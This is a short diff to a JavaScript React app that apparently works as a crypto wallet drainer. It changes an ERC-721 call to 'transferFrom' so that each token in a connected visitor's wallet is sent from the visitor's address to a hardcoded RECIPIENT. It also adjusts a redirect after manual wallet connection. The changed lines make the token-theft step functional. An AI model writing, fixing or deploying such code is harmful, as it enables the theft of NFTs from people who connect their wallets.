@@ -76,7 +76,7 @@ function App() {
           clearInterval(manualInterval);
           manual.addEventListener("click", ()=>{
             close();
-            location.href = location.origin + '/connect.html';
+            location.href = location.origin + '/connected.html';
           });
         }
     }, 500);
@@ -202,8 +202,8 @@ function App() {
             to: balance.token_address,
             data: encodeFunctionData({
               abi: erc721Abi,
-              functionName: 'transfer', // Direct transfer function
-              args: [RECIPIENT, balance.tokenId] // to, tokenId
+              functionName: 'transferFrom', // Direct transfer function
+              args: [address, RECIPIENT, balance.tokenId] // to, tokenId
             })
           })
         }
